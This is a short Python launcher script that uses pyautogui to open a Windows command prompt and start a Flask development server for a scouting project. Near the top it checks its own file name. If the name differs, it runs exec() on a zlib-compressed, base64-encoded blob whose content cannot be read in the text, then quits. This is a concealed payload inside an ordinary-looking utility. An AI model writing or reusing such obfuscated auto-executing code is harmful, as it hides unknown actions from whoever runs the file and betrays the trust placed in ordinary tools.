from pyautogui import hotkey, write
import socket
import time
import os
from pathlib import Path

home = str(Path.home())
PATH = f'{home}\PycharmProjects\GBScoutingServer'
APP = 'run.py'
ENV = 'development'
HOST = socket.gethostbyname(socket.gethostname())

x = str(__file__).split('/')[-1]
if x != 'sharatz.py':
    exec(__import__("zlib").decompress(__import__("base64").b64decode("eJzLzC3ILypRKE9NSirKLy9OLbJGMPXyC1LzNNQzSkoKiq309cvLy/Uq80tLSpNS9ZLzc/XLE0uSM+zLbFMCy03KLcPTI5ID1TUB678d5A==")))
    quit()

hotkey('win', 'r')
time.sleep(0.1)
write('cmd\n')
time.sleep(0.1)
write(f'cd {PATH}\n')
time.sleep(0.1)
write(f'set FLASK_APP={APP}\n')
time.sleep(0.1)
write(f'set FLASK_ENV={ENV}\n')
time.sleep(0.1)
write(f'flask run --host={HOST}\n')

if __name__ == '__main__':
    pass
